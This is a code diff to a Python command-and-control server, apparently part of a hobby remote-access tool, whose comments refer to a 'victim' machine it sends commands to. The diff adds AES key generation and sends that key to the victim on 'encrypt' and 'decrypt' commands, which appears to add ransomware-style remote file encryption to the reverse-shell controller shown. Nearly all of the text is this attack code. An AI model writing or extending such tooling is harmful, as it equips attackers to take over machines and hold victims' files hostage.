@@ -1,5 +1,7 @@
 import socket
 import struct
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
 
 SERVER_HOST = "10.0.1.24" # desktop
 SERVER_PORT = 4444
@@ -25,6 +27,12 @@ print(f"{client_address[0]}:{client_address[1]} Connected!")
 # Receiving the current working directory from the victim
 cwd = client_socket.recv(BUFFER_SIZE).decode()
 print("[+] Current working directory", cwd)
+
+# AES stuff, generate key asdasdasd
+key = get_random_bytes(16) # 16 bytes is the minimum length of AES
+#print(key)
+#cipher = AES.new(key, AES.MODE_EAX)
+
 
 # Loop for making commands and sending them to the victim
 while True:
@@ -57,10 +65,16 @@ while True:
 
         client_socket.send("1".encode())
     elif splitted_command[0].lower() == "encrypt":
-        encryption_key = client_socket.recv(BUFFER_SIZE)
+        client_socket.recv(BUFFER_SIZE)
+        # Send AES key to victim
+        client_socket.send(key)
+
+        #encryption_key = client_socket.recv(BUFFER_SIZE)
         client_socket.send("1".encode())
     elif splitted_command[0].lower() == "decrypt":
         encryption_key = client_socket.recv(BUFFER_SIZE)
+        # Send AES key to victim
+        client_socket.send(key)
         client_socket.send("1".encode())
 
     output = client_socket.recv(BUFFER_SIZE).decode()
